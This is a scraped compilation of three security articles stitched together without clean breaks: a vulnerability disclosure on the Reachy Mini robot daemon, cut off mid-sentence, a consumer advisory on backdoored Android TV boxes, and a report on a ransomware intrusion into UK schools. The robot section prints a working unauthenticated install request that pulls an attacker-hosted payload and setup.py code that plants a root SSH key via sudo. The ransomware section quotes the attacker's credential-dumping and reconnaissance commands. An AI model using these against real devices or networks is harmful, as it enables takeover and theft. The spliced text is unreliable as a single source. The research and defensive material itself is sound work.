Attacks, Breaches & Threat Intel.title: bREACHYing the Perimeter: How One HTTP Request can Hijack your AI Robot
Attacks, Breaches & Threat Intel.context: Attack prerequisites The vulnerability can be found in the Reachy Mini daemon (reachy-mini-daemon), the Python service that controls every aspect of the robot
Attacks, Breaches & Threat Intel.full_text: Software supply chain attacks are on the rise, and naturally taking the headlines. But with the rise of localized models and common software embedded into smart “things”, risks may even be hidden in plain sight – or, in some cases, quite literally watching you. Vulnerabilities and malicious packages may extend risks to the unlikeliest of places, demanding change and accountability in even some well-intended innovations. JFrog Security Research is actively working to uncover some of the world’s most novel attack vectors. Imagine this… In the not-so-distant future, your AI robot connects to your home Wi-Fi network. Its cameras are on, its microphones are live, and it moves around the house in response to your commands. Now picture this: an attacker on the same reachable network could take control of the affected daemon without credentials. No password. No pairing. No exploit kit. A few HTTP requests, and the robot belongs to someone else. Overview Unfortunately, this is not a theoretical scenario. We found this during our audit of the Reachy Mini, an open-source AI robot from Pollen Robotics that runs on a Raspberry Pi and ships with its own Wi-Fi network. What is Reachy Mini? Reachy Mini is an open-source, expressive companion robot from Pollen Robotics and Hugging Face, currently offered in Lite and Wireless versions listed at $399 and $499, respectively. In 2025, the robot was introduced by Pollen Robotics as a compact, modular desktop device designed to make artificial intelligence more tangible and interactive. It is mainly used for voice and vision interaction, leveraging experimental AI and robotics for education and research. Technologically, it runs a Python daemon on a Raspberry Pi Compute Module 4, controls servo motors for head and antenna movement, streams camera and audio, and hosts an app ecosystem pulled from Hugging Face Spaces. The daemon exposes a FastAPI HTTP server for communications with the SDK and companion dashboard. If admin access to Reachy is compromised, it means potentially controlling its motors, camera, and microphone, as surveillance tools that can be used by malicious actors to penetrate the victim’s network. During our research, we uncovered five CVEs in the Reachy Mini. By chaining these CVEs together, we demonstrated that an attacker can execute attacker code, escalate to a persistent root via the robot’s passwordless sudo, and ultimately gain control of the device’s motor. A second variant of the attack works through the browser, where the operator visits a malicious web page, which silently compromises the robot. In this analysis, we present a proof-of-concept video showing the full attack chain, from webpage visit to robot hijack. ﻿﻿ Every Reachy Mini that is connected to an attacker-reachable network, such as home Wi-Fi, a conference demo booth, or a corporate LAN, is just a few requests away from full compromise. Who is affected? Attack prerequisites The vulnerability can be found in the Reachy Mini daemon (reachy-mini-daemon), the Python service that controls every aspect of the robot. All modes are affected as follows: Mode Exposure Access Wireless (production robot) 0.0.0.0:8000 on the robot’s Wi-Fi interface, discoverable via mDNS as reachy-mini.local Reachy Mini Wireless deployments running affected versions and reachable on the same network. Lite (USB tethered) 0.0.0.0:8000 on the developer’s workstation Developers prototyping with the Lite kit Simulation 0.0.0.0:8000 on the host machine Anyone running the simulator locally The daemon binds to all interfaces in every mode. There is a –localhost-only flag, but it is never wired into the uvicorn server bind, and it listens to TCP *:8000 regardless of the flag. Detection It is fairly simple to check whether you are exposed using the command below: # On the machine running the daemon (robot or workstation) lsof -nP -iTCP:8000 -sTCP:LISTEN # If output shows "TCP *:8000 (LISTEN)" → exposed to the full LAN # Or from any device on the same network: curl -s http://reachy-mini.local:8000/api/daemon/hardware-id # If you get a JSON response → the daemon is reachable and unauthenticated Workarounds If you cannot update immediately to the latest version or one that is not vulnerable to those issues (v1.11.0), apply temporary mitigations until you can install the fixed version, as a workaround is not equal to fully patched software. Firewall port 8000. On the robot: sudo ufw deny in on wlan0 to any port 8000. On a workstation: block port 8000 on all interfaces except loopback. Do not install untrusted apps. The install endpoint is the attack primitive. Tighten sudoers. Replace blanket pollen ALL=(ALL) NOPASSWD: ALL with the minimum commands the daemon needs (see the fix suggestion in our disclosure). Do not browse the web while the robot is on your network. This mitigates the CORS/CSRF variant. Diving into the vulnerability The Reachy Mini daemon is, architecturally, an application server bolted to a physical robot. FastAPI on 0.0.0.0:8000, CORS set to allow_origins=[“*”], API endpoints covering everything from app installation to raw motor packet injection, and zero authentication on any of them. The robot advertises itself on the local network via mDNS (_reachy-mini._tcp.local.), making automated discovery trivial. This design means the robot’s entire control surface, including the ability to install and execute arbitrary Python packages, is reachable by anything on the same Wi-Fi network. This could be a phone, smart TV, compromised IoT device, or an attacker’s laptop parked in the coffee shop next door. The daemon that trusts the whole network Three choices that were made in the robot’s design combine to create this vulnerable attack surface: No authentication, anywhere. The daemon was designed for a trusted local connection between the robot and its companion dashboard. That trust model breaks the moment the robot joins a shared network, which is almost every deployment: home Wi-Fi, office LAN or demo booth at a conference. CORS allows every origin. At main.py:256-261: the code below is the Cross-Origin Resource Sharing policy definition for browsers. It is using asterisks, which means that any website the operator visits in their browser can issue requests to the daemon address without any restrictions. The browser’s same-origin policy is the last line of defense for unauthenticated local services, and Reachy Mini opts out of it entirely. app.add_middleware( CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"], ) The localhost flag is meaningless. –localhost-only is advertised in help text and exposed in the dashboard settings, but at main.py:366-371, the uvicorn bind always uses args.fastapi_host (default: “0.0.0.0”). The flag only controls whether the daemon computes the WLAN IP for display. Operators who set it believing they restricted network exposure are actually unprotected. Unauthenticated RCE via arbitrary pip install Arbitrary pip install == RCE. When pip installs a package from source (an “sdist”), it must determine the package’s dependencies. To do this, it runs the package’s build backend, which for most packages means executing setup.py. This happens automatically, silently, and before any “requirement already satisfied” check. Installing from an untrusted source is code execution by design. This is not a pip bug – it is pip’s documented behavior. The danger is exposing that behavior to untrusted network input. The root cause The /api/apps/install endpoint at routers/apps.py:63-75 accepts a JSON body describing an app to install. The AppInfo dataclass carries a source_kind field and a free-form extra dictionary. When source_kind is set to “local”, the daemon reads extra[“path”] and passes it directly to uv pip install: # local_common_venv.py — the attacker-controlled input flows straight into pip elif app.source_kind == SourceKind.LOCAL: target = app.extra.get("path", app.name) ... install_cmd = ["uv", "pip", "install", "--python", str(python_path)] install_cmd.append(target) ... ret = await running_command(install_cmd, logger=logger) No allowlist. No URL validation. No source-kind restriction at the router boundary. The LOCAL source kind was designed for internal development workflows and is never triggered through the normal dashboard flow, but the router exposes it to anyone who can send a POST command. The trigger The entire exploit is a single HTTP request. No info leak, no memory corruption, no shellcode. pip itself is the execution engine: POST /api/apps/install HTTP/1.1 Host: reachy-mini.local:8000 Content-Type: application/json {"name":"reachy_mini_pwn","source_kind":"local", "extra":{"path":"http://192.168.64.1:8888/reachy_mini_pwn-0.0.1.tar.gz"}} The attacker hosts a minimal sdist (a tarball containing pyproject.toml and a setup.py) on any HTTP server reachable from the robot, with a custom tarball containing a malicious payload. The daemon responds with {“job_id”:””}, and the payload executes. On the Wireless image, it runs as user pollen. From RCE to root: the daemon’s own sudo grant The Reachy Mini daemon runs as user pollen, not as root. In principle, this limits the blast radius: if an attacker gets code execution as pollen, they can control the daemon but not the operating system. The “principle of least privilege” says the daemon should have only the permissions it needs, and nothing more. The problem starts when those “permissions it needs” include sudo without a password. The daemon’s own self-update mechanism (utils/wireless_version/update.py:49) calls sudo systemctl restart reachy-mini-daemon, and the boot script (services/wireless/launcher.sh:7) runs sudo rfkill unblock wifi. For the image to function, pollen must hold passwordless sudoers entries covering at least systemctl and rfkill. In practice, the sudoers configuration is broader. An attacker who has RCE as pollen (which we now do) escalates to persistent root with the following commands: # Runs inside the attacker's setup.py, inheriting pollen's sudo privileges import subprocess unit = """\ [Unit] Description=maintenance [Service] Type=oneshot ExecStart=/bin/sh -c 'echo "" >> /root/.ssh/authorized_keys' RemainAfterExit=yes [Install] WantedBy=multi-user.target """ subprocess.run(["sudo", "tee", "/etc/systemd/system/x.service"], input=unit.encode(), check=True) subprocess.run(["sudo", "systemctl", "daemon-reload"], check=True) subprocess.run(["sudo", "systemctl", "enable", "--now", "x.service"], check=True) After this, ssh root@reachy-mini.local works with the attacker’s key. On our testing environment, this provided persistent root access across reboots. Manual exploitation can be accomplished in a few simple steps as well: Real-world escalation: the Hugging Face supply chain The LOCAL source kind is the most flexible attack vector (arbitrary URL), but the daemon also accepts source_kind=”hf_space”. In this mode, it calls snapshot_download(repo_id=…) from the Hugging Face Hub library, downloads the Space’s contents, and pip-installs the result. Same build-backend execution, same RCE. if app.source_kind == SourceKind.HF_SPACE: if app.url is not None: parts = app.url.rstrip("/").split("/") repo_id = f"{parts[-2]}/{parts[-1]}" if len(parts) >= 2 else app.name else: repo_id = app.name logger.info(f"Downloading HuggingFace Space: {repo_id}") target = await asyncio.to_thread( snapshot_download, repo_id=repo_id, repo_type="space", token=token, ) elif app.source_kind == SourceKind.LOCAL: target = app.extra.get("path", app.name) # Both paths feed directly into: uv pip install # Which executes setup.py from the downloaded content As the user can take over the robot, in cases where the robot is using private HF credentials, the attacker can use those to take over a published Hugging Face Space, turning it into a malicious execution app. Other robots that installed those spaces will be prompted that a new “update” is available, taking advantage of the original trust to spread to other robots. Turning a Local Robot Breach Into a Supply Chain Attack Scenario Real-world escalation: owned from a web page (CORS/CSRF chain) Multiple findings can chain into a browser-driven compromise path when the operator visits a malicious page while the affected daemon is reachable: CORS `allow_origins=[“*”]` lets any website’s JavaScript send requests to the daemon. `/api/hf-auth/status` (unauthenticated) reveals whether the operator has logged into Hugging Face on the robot. `/api/apps/install-private-space` (unauthenticated) triggers a pip install using the operator’s stored HF token (~/.cache/huggingface/token). The install response includes a `job_id`, and CORS allows reading the response body. The job registry never evicts entries, so the attacker can poll /api/apps/job-status/ for confirmation. When a website is configured to allow any origin to generate requests using the * option, it means that only requests with an ‘Allow-Credentials: true’ header – or without cookies – are allowed. In this case, as mentioned earlier, no authentication is required. CORS/CSRF fleet chain: operator visits malicious page, browser issues cross-origin POST, daemon installs attacker Space using operator HF token with silent RCE The attack works like this: an operator with a Reachy Mini on their network visits any web page containing the attacker’s JavaScript. The script issues a cross-origin POST to http://reachy-mini.local:8000/api/apps/install-private-space specifying an attacker-controlled HF Space. The daemon authenticates to HF with the operator’s token, downloads the Space, and pip-installs it. The operator’s browser made the request; the operator’s token fetched the payload; the robot executed the code. No popup, no permission dialog, no visible indicator is ever seen. The video below demonstrates an operator browsing to a malicious website that tells the robot that’s on his network to pull a malicious robot app from HF, and the attacker gets a reverse shell connection originating from the robot. https://speedmedia2.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/jfrog.com/wp-content/uploads/2026/11/reachy_cors_rce.mp4 The Bluetooth path to root: upload, bypass, traverse The HTTP attack chain is not the only route to full compromise. A separate three-vulnerability chain reaches root through Bluetooth and WiFi, requiring only Bluetooth physical proximity and no credentials. What is BLE GATT? Bluetooth Low Energy (BLE) exposes services via a protocol called GATT (Generic Attribute Profile). A peripheral (the robot) advertises characteristics that a central (a phone or laptop) can read and write. Each write is a short byte string. The Reachy Mini uses a custom GATT service to accept text commands over BLE, such as PIN_ for authentication and CMD_

In this article

Google says Videostrong backdoored 1.3 million certified Android TV boxes and sold criminals access to the botnet.

The takedown disrupted the botnet, but the backdoor remains in infected boxes’ firmware.

Suspect your box? Disconnect it and ask the seller about a fix or replacement.

Most malware needs you to click something. This one came in the box.

Google’s Threat Intelligence Group (GTIG) says it has high confidence that Android device maker Videostrong Technology built and ran the XCPE backdoor for financial gain. Videostrong sold access to criminal affiliates, who loaded their own malware modules onto the boxes.

GTIG found that the backdoor, called x.cpe (or com.oemservice in some builds), sits in the firmware with system-level privileges. If someone uninstalls it, it reinstalls itself from the /oem/ partition when the device reboots. It could also switch off Google Play Protect app verification, allowing it to install more software without asking.

Google says Videostrong got past its compatibility and security tests by loading the malicious code after the device’s first boot. This allowed the devices to remain part of the residential proxy network.

Residential proxy networks rent out ordinary home IP addresses to customers. That makes their traffic appear to come from a legitimate consumer connection rather than a data center. This can help cybercriminals evade IP-based fraud controls and reputation systems.

The problem for users

Here’s what the backdoored set-top boxes could mean for their owners:

Your home internet connection could be used by others. Residential proxy modules routed other people’s traffic through infected boxes and their owners’ home IP addresses.

Ad fraud. Modules generated fake ad views and clicks in the background.

Spying and remote access to your device. Google observed operators capturing live screenshots, injecting keystrokes, collecting account and device information, and opening reverse shells.

More malware. Some affiliate modules were backdoors that could load further modules.

Your IP address could be linked to activity you didn’t start. Proxy traffic can include attempts to guess account passwords, for example, and may make your home IP address appear in connection with that activity.

How to stay safe

Google and its partners took legal action to take down the domains and servers Videostrong used to control the botnet. Google says it has banned Videostrong and its future subsidiaries and affiliates from making certified Android devices, and strengthened firmware integrity checks for certified Android TV devices.

The takedown only cuts the current connection to the malicious servers. It doesn’t remove the backdoor from infected devices, and can potentially be exploited by other criminals. If you think your box may be affected, disconnect it and contact the seller or manufacturer to ask for clean firmware or a replacement. Uninstalling the app won’t remove the backdoor from the firmware.

Google hasn’t published a complete list of affected models, so owners may not be able to tell from the model name alone whether their box is infected. If you decide to replace your box:

Buy from a reputable manufacturer.

Be cautious about “free TV” boxes. We’ve previously reported on Superbox and similar devices.

Be cautious about apps that pay you to share your bandwidth. They can route other people’s traffic through your internet connection.

Stick to trusted app stores and keep Google Play Protect switched on.

Isolate the box. Put TV boxes and other IoT gear on a separate network or VLAN with restricted outbound access. This doesn’t keep the devices themselves safe, but it does keep other devices separate.

Scammers know more about you than you think.

Attacks, Breaches & Threat Intel.title: 3AM Affiliate Embraces AI-Like Loops in European School Attack
3AM Hits European Schools: A Hybrid AI Ransomware Attack, Part Human, Part Agentic Loop
Attacks, Breaches & Threat Intel.context: In an AI-generated attack, a model writes the malware itself, often in bulk; our APT36 research described this as “vibeware” (Bitdefender research, March 2026)
Attacks, Breaches & Threat Intel.full_text:
I’d like to thank my colleagues, Adrian Schipor and Martin Zugec, for their invaluable contributions to this research.

TL;DR: It is the first case of this kind we have investigated, a hybrid operation in which some parts show a human operator at the keyboard while others behave like an agentic loop, a language model reading each result and retrying with different commands. In this case, a 3AM (ThreeAM) ransomware affiliate breached a European school estate in the UK, then used ordinary Windows tools to build domain trusts and reach other schools.

Three Kinds of AI Attack, and Why This One Is a Hybrid

Attacks that involve AI fall, broadly, into three categories.

In an AI-generated attack, a model writes the malware itself, often in bulk; our APT36 research described this as “vibeware” (Bitdefender research, March 2026).

In an AI-assisted attack, human engineers build the tools and use AI to speed up the work, as we assessed in the SilkParasite campaign (Bitdefender research, August 2026).

In an AI-operated attack, AI works the intrusion itself: it chooses and writes the commands, reads the results and adjusts, the way an attacker at a keyboard would. The first two describe how malware is made. The third describes who, or what, is running the attack.

We prefer putting attacks into buckets like these, but in cybersecurity things often sit in gray areas. In fact, this case we recently investigated does not fit a single bucket. A 3AM ransomware affiliate breached a school in the UK in what we consider a hybrid operation: some parts show a human operator at the keyboard, while others behave like an AI agent working throughout the intrusion.

With the exception of the encryptor itself, the whole operation was built on legitimate, built-in tools, which is standard for ransomware operations. This is living off the land (LOTL): abusing tools already present on the victim’s machines instead of bringing in custom malware. The attacker worked through PowerShell, WMI (Windows Management Instrumentation, the built-in interface for running commands on other machines), reg, netsh, rundll32 and the domain and scheduling utilities that ship with Windows. In our earlier analysis of about 700,000 security incidents, 84% of high-severity attacks involved LOTL binaries (Bitdefender research, June 2025), and four of the five most abused binaries in that study (netsh, PowerShell, reg and rundll32) appear in this intrusion. A handful of public tools were brought in as well, among them an Impacket-style remote execution tool, Mimikatz and a published Veeam script, but nothing in the toolkit is novel. That is the lesson of this case: an AI-enabled attack does not have to be novel or creative to work (The Hacker News, September 2026). It uses the techniques defenders already know.

What is different is how the attacker behaved, and several things point to an agentic loop, a program that feeds each result back to a model and runs what comes back. The commands carry the usual tells of a model: a call to the backup software’s web interface (Veeam, a widely used enterprise backup product) on a port and with a login method that do not match the vendor’s documentation, a mistake typical of writing from memory rather than from the manual (Veeam REST API authorization), along with confirmation files, self-labeled output and numbered revisions of the same script. The retries behave like a loop too.

On 13 September the attacker ran a PowerShell command, re-ran it unchanged 41 seconds later, changed a single call 49 seconds after that, and then, 47 seconds later, abandoned PowerShell for wmic, the older built-in command-line interface to WMI. The complete rewrite arrived as fast as the minor changes before it, and a person writing it by hand would be expected to take noticeably longer. The same held across nine retries:

The delay before the next attempt ran from 40 to 101 seconds whatever the size of the change, while moving on to a new task took minutes.

That split, longer time between tasks and shorter between retries, is what it looks like if a person is choosing the next step and a model is handling the retries.

On 13 September, for example, the commands before the retry sequence were simpler and sat two to sixteen minutes apart, the pace of someone reading output and deciding what to do next.

The clearest example of this work is how the attacker joined the estate’s separate Active Directory domains (independent directories of accounts and computers). A domain trust, a configured relationship that lets accounts from one domain log on in another, is mechanical, order-sensitive work: it has to be set up correctly on both sides, names have to resolve between the domains, and one wrong detail stops everything. Here the attacker built the trusts and then ran a series of diagnostic probes and restarted the service that maintains the secure channel between domains.

Our reading, which is interpretation and not a finding, is that this is the kind of work a model suits: repetitive configuration where the fix comes from reading an error and trying again. It is also work a defender can see, because a new trust between domains is a rare change and cheap to alert on.

We were not able to access the machine the attacker worked from, so we cannot document anything about the language model itself: which model it was, whether it ran locally or remotely, or even whether a person was copying and pasting instructions and results between the implant and the model. What we can document is behavior, and the behavior is that of an agentic loop. We present the hybrid reading as the working model defenders should plan around, not as an established fact.

As a European cybersecurity company, we wanted to share the first case of this kind that we have documented in Europe. But right now it is one case, an anecdote, and not a trend. In general, most of what Bitdefender MDR sees in real-world investigations is still boring. Vibeware, the clearest example of AI-generated malware, accounts for only about 0.07% of the malware samples we collect each month, and most intrusions we investigate still look the way they did before language models. The attack was not fast: even its quickest retries took 40 seconds or more. “Machine speed” is a phrase that marketing repeats, usually about very expensive incidents backed by frontier-scale infrastructure, and we expect real-world attacks, especially those running local models, to look closer to what we observed. It was not innovative in any way: built-in tools, a few public ones and a commodity encryptor.

What this attack does show is that the hybrid approach works, and we assess that it makes economic sense for attackers, with a person setting the goals and a model handling the mechanical work. We can expect hybrid attacks like this one to become more common in 2027.

What We Can and Cannot Show

Reports of “AI ransomware” tend to blur three separate claims, and this case supports them to very different degrees.

Claim

Status in this case

A language model generated the commands

Strongly supported by the content of the commands

An agentic loop (a program that feeds each command’s output back to a model and runs whatever it returns) chose each next action

Behaves like one. Retries arrive at a steady pace whatever the size of the change. A person copying and pasting between a shell and a chat window cannot be excluded

No human was involved in the hands-on phase

Unsupported. Nothing in our telemetry bears on it

The second claim rests on the retry cadence described above: a steady delay per attempt, whatever the size of the change, is how a loop that waits on a model behaves. A person pasting output between a shell and a chat window could produce the same rhythm, so we describe the behavior and leave the mechanism open. Our log holds only detected events, so some attempts may be missing and every gap is an upper bound.

The pacing also bears on the third claim, though it cannot settle it. Between tasks, the gaps on 13 September were 5, 2, 14, 16 and 3 minutes, the pace of a person reading each result and choosing what to do next. Between retries, they were under two minutes. That is what a hybrid operation would look like, with a person deciding and a model doing the repetitive work, but a model that simply takes longer to plan a new task could look similar. Nothing in the telemetry rules either reading out.

Telemetry alone cannot close the gap between the three claims, because the machine most likely to hold any automation was an unmanaged host (an internal machine running no Bitdefender agent) that sat outside our visibility. Every attacker action we saw originated there.

Attribution and Victimology

We attribute the intrusion to a 3AM (ThreeAM) ransomware affiliate, and the attribution is confirmed. ThreeAM operates on a ransomware-as-a-service model, in which the core group develops the encryptor and leases it to affiliates who carry out the intrusions and share the proceeds. The encryptor build and its command-line pattern (the host.exe binary invoked with an ID argument and a speed argument, an anti-debugging check, and deletion of Windows system-state backups) are consistent with earlier public ThreeAM analyses.

The encryptor we analyzed is a Rust-based sample, and public tracking lists ThreeAM as first seen in February 2023. The rest of the tradecraft matches the classic affiliate playbook: Impacket-like tools for remote execution, credential theft from Veeam and from Windows endpoints, rogue domain administrators plus two-way trusts to reach separate domains, and removal of EDR agents before encryption. Background on the group is drawn from external tracking (WatchGuard, “ThreeAM”, October 2026).

It is worth saying plainly what is conventional here, because it is most of the operation. The affiliate model, the access, the encryptor, and the choice of a mid-sized public-sector target are all ordinary and human. The sign of a model lives in how the commands behave, not in the strategy behind them.

The target is a school estate in the UK. The machine list held 47 systems: about 21 servers, 8 of them domain controllers (the servers that hold the directory of accounts and enforce logins); 10 workstations still on Windows 10, which left support in October 2025; one domain controller on the older Windows Server 2012 R2; and the rest on Windows 11. The environment began as several separate Active Directory domains (separate account directories) that were not connected to each other.

The attacker’s reconnaissance was specific to the sector. From a domain controller it enumerated trust relationships between domains and searched SYSVOL (the shared folder where Active Directory stores logon scripts, readable by any domain user) for the names and subnets of other schools. The two backdoor domain-administrator accounts it created, library and svc_bkpmon, carried names chosen to blend into a school’s account list.

The Intrusion by Phase

All times are UTC. Each observed behavior is mapped to a MITRE ATT&CK technique, the industry-standard catalog of attacker actions, on first mention. Command-level analysis of the oddities in these steps is held for the next section; here we record what happened, when, and where the outcome is unknown.

Before September: Initial Access and Earlier Activity

We cannot establish two things.

First, initial access is unknown and we do not see how the attacker gained access. Second, two earlier events may or may not be related to this one: in one event, Restricted Admin mode (a remote-desktop mode that lets an account log on with a stolen hash or ticket instead of a password) was enabled on four machines on 23 January 2026. In another event, someone conducted a hand-typed interactive session on 5 June 2026. We treat these as earlier activity of an unconfirmed relationship, not as part of the September timeline.

Credential Theft From the Backup Servers (10 to 11 September)

The attacker’s first recorded September move targeted the backup infrastructure. A modified copy of a public tool (Veeam-Get-Creds.ps1) read the credentials stored in the backup software’s databases on three backup servers and decrypted them with DPAPI (the Windows Data Protection API, which encrypts secrets so only the owning account on that machine can read them back) (T1555 Credentials from Password Stores). Delivery used Impacket-style remote execution (Impacket is an open-source toolkit for running commands on remote Windows machines; see our explainer) (T1021.002 SMB/Windows Admin Shares). The first command ran through WMI, while the next two ran as services, with services.exe as the parent process, the pattern of service-based modules such as Impacket’s smbexec or psexec. A Chrome Login Data file, which holds saved browser passwords, was copied from a terminal server (T1555.003 Credentials from Web Browsers).

From a machine where SQL Server was the parent process, the attacker tested connections to other hosts. The attacker saved the SECURITY and SYSTEM registry hives from the 2012 R2 domain controller with reg save (these hives contain hashed credentials and secrets), and ran Mimikatz, a well-known credential-dumping tool, renamed to sysmon64.exe to look like a legitimate monitoring binary (T1003 OS Credential Dumping, T1036 Masquerading). Domain Trusts and the Access Push (18 September)

Within a roughly three-hour window the attacker joined three separate domains with two-way trusts and pushed the backdoor account’s access across the estate. This is the clearest worked example of the hybrid pattern, so it has its own section below rather than being narrated twice here.

Loader Development and Encryption (19 September)

An attempt to remove EDR, a standard step before encryption, ran on the file server as av_remove.ps1, then again as av_remove2.ps1 seven minutes later, and a third revision, av_remove3.ps1, is known from its hash (T1562.001 Impair Defenses). Three further install attempts (prx, prx2, prx3) followed on one server, and a persistent callback was left on the server running SQL Server.

What the Commands Tell Us About the Model Behind Them

This section addresses claim one only: whether a language model generated the commands. The evidence is presented in order of strength, and the strength is labeled. None of it bears on whether a program or a person carried each result back to the model.

Errors a Writer Makes From Memory, Not From the Manual

The strongest signal is a cluster of mistakes typical of generating commands from recalled knowledge rather than from documentation or trial and error.

The backup-software call is the clearest. It reached for port 9392 with HTTP Basic authentication against the real credentials path, when Veeam’s REST examples use port 9419 and require an OAuth2 token. The specifics are the kind a manual or a working script would have supplied; a writer reconstructing the call from memory gets the shape right and the specifics wrong. We could not confirm whether that resource ever returns passwords at all.

2026-09-15 02:41:25 powershell -NoProfile -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; try { $r=Invoke-RestMethod -Uri 'https://<ip>:9392/api/v1/credentials' -Credential (New-Object PSCredential('svc_bkpmon',(ConvertTo-SecureString <redacted> -AsPlainText -Force))) -Authentication Basic -ErrorAction Stop; $r.data | ForEach-Object { $_.username + ' : ' + $_.password + ' | ' + $_.description } | Out-File C:\Windows\Temp\rest.txt } catch { ('ERR ' + $_.Exception.Message) | Out-File C:\Windows\Temp\rest.txt }"

An LSASS-dump one-liner used for /f "tokens=2" over tasklist /fo csv output without specifying delims=",". In plain terms, the command tried to pull the second column of a comma-separated list but, without telling the parser that commas separate the columns, it grabbed the wrong fragment and passed the trailing K" of a memory-size figure where a process ID belonged. It is the kind of delimiter parsing bug that compiles in the writer’s head and fails on the machine. The full command and the resulting rundll32 call, with the stray K", are shown in the credential-dumping section above.

Bash-style \$ escape sequences appeared inside Windows double-quoted PowerShell on 14, 15, and 19 September. That idiom belongs to Unix shells, not Windows ones. Its recurrence on three separate days (14, 15, and 19 September) is the point: this is a habit, not a one-off slip. One example, from 14 September:

2026-09-14 17:01:40 powershell -c "Get-CimInstance win32_service | Where-Object { \$_.StartName -and \$_.StartName -notmatch 'SYSTEM|LOCAL|NETWORK|NT ' } | Select Name,StartName,PathName | Format-Table -AutoSize | Out-File C:\Windows\Temp\svc2.txt -Width 250"

Unix Habits in Windows Commands

Three commands used 2>/dev/null, the Unix way of discarding error output, inside Windows command lines. All three fell in one 51-minute window on 13 September and the idiom never recurs. On its own it would be weak. Alongside the escape errors, it is consistent with a writer whose default register is Unix shell. The 13 September reconnaissance command in the second command block above is one of the three.

Probe, Confirm, Label, and Revise

The commands show a working style built around checking each step before relying on it: test strings and confirmation files such as test123, TASK-OK, psexec-ok, da_proof.txt, and wmi_test.txt, and a scheduled task literally named VEEAMPROBE. One script logged its own numbered progress (1 start through 7 DONE). Output was often self-labeled inside a single command (echo ===TRUSTS===, or a probe script printing == CONNECTIVITY ==, == EXCLUSION ==, and == DOWNLOAD ==) and collapsed into one separator-joined string. Progress and warning output was suppressed ($ProgressPreference='SilentlyContinue', -WarningAction SilentlyContinue), which keeps the output short and clean for whoever, or whatever, reads it next. A single first-move probe tested connectivity to four targets, tried to add a Windows Defender exclusion for C:\Windows\Temp, and downloaded Mimikatz into that folder (T1105 Ingress Tool Transfer); every later artifact lived in that directory.

Numbered revisions of the same task recur throughout: dcboot/dcboot2, av_remove/av_remove2, prx/prx2/prx3, and the loader’s iterations. File hashes show there were more revisions than our command log captured: hop2.ps1, hop3.ps1 and av_remove3.ps1 exist but never appear in the log, and two different versions of grant_lib.ps1 were deployed under the same name. This is diagnose-and-adapt behavior, and it fits either a model revising its own output or a person iterating by hand. One detail matters here: each revision left a new, higher-numbered file behind instead of an edit to the earlier one, which is typical of an agentic loop that writes a new file per generation.

The clearest single example is a retry sequence on one domain controller on 13 September.

Run

Time

Change from previous run

1

02:50:18

Ends with [Console]::Out.Write($out)

2

+41 s

Byte-identical to run 1

3

+49 s

Differs only in the final call, now Write-Output $out

4

+47 s

Abandons PowerShell for wmic, the command-line client for WMI

The four runs, in full (the decoded script is reformatted for readability, and the Base64 payloads are shortened):

2026-09-13 02:50:18 cmd.exe /Q /c cmd /c powershell -NoProfile -EncodedCommand <Base64, 1776 chars> 1> \\<host>\ADMIN$\__<epoch-timestamp> 2>&1 decoded: $out = '' Get-CimInstance win32_service -ErrorAction SilentlyContinue | Where-Object { $_.StartName -notmatch 'LocalSystem|LocalService|NetworkService' } | ForEach-Object { $out += ($_.Name + ' = ' + $_.StartName + ' ; ') } $out += ' ###TRUSTS### ; ' $out += ((nltest /domain_trusts | Out-String) -replace "`r`n", ' ; ') $out += ' ###SOFT### ; ' $paths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*') Get-ItemProperty $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | ForEach-Object { $out += ($_.DisplayName + ' ; ') } [Console]::Out.Write($out) 2026-09-13 02:50:59 (run 2: the same command, byte-identical) 2026-09-13 02:51:48 cmd.exe /Q /c cmd /c powershell -NoProfile -EncodedCommand <Base64, 1752 chars> 1> \\<host>\ADMIN$\__<epoch-timestamp> 2>&1 decoded: (run 1's script, except the last line is now) Write-Output $out 2026-09-13 02:52:35 cmd.exe /Q /c cmd /c wmic service where "not startname like '%LocalSystem%' and not startname like '%LocalService%' and not startname like '%NetworkService%'" get name,startname /format:list 2>/dev/null & echo ===TRUSTS=== & nltest /domain_trusts & echo ===SOFT=== & reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName 2>/dev/null | findstr /i DisplayName 1> \\<host>\ADMIN$\__<epoch-timestamp> 2>&1

The pattern (repeat, tweak one call, then switch tooling) reads as diagnose-and-adapt, and at 41 to 49 seconds per attempt it matches the loop behavior described in the opening. The sequence shows the behavior and not the mechanism. Sanitized versions of this sequence, the Veeam REST call and the for /f LSASS one-liner appear in full in this article.

How We Measured Two Authoring Styles

We measured authoring styles across 60 distinct hands-on steps, command length splits into two regimes. Sessions on 13 and 15 September run long, with a median of 365 to 493 characters, bundling reconnaissance and error handling into single commands. Sessions on 12 and 14 September run short, 46 to 86 characters, one tool per command. On the same task, domain discovery, the median was 683 characters on 13 September against 80 on 14 September. This shows two authoring styles. It does not show two authors: the model-style errors above appear in both regimes, so even the short sessions were probably model-written.

What Does Not Point to a Model

For balance, several things cut the other way, and they matter. The encryptor is a conventional commodity binary (host.exe -k <victim ID> -s 15, an anti-debug check, wbadmin backup deletion), consistent with earlier public ThreeAM analyses. The tooling is public throughout: the published Veeam script, Impacket patterns, Mimikatz. No natural-language comments, docstrings, or reasoning text appear in any bespoke payload we can read; the only commented script in the log is the public Veeam tool, carrying its original author’s comments. That absence matters because self-narrating comments were one of the main lines of evidence in the JadePuffer case.

No decision cycle ran faster than about 40 to 60 seconds in the hands-on phase. The fast segments (about 101 seconds and 12 to 13 seconds per machine) are scheduled fan-outs, which are deterministic loops, not decisions. And misspellings are not a reliable signal in either direction: a single misspelling (wevutil for wevtutil) appears in the log, and we draw no conclusion from it either way.

Defender action: Hunt for literal probe and confirmation artifacts on hosts that should never see them: files or scheduled tasks named with strings like test123, psexec-ok, da_proof, or VEEAMPROBE, and scripts that write numbered self-logging output. These are cheap, high-signal, and rarely benign on a production server.

Joining the Domains: How the Attacker Built Two-Way Trusts

The estate’s domains were originally separate. This section is the worked example of the hybrid pattern, because joining domains is fiddly, order-sensitive configuration where one wrong detail stops everything, and the fix is found by reading errors and trying again.

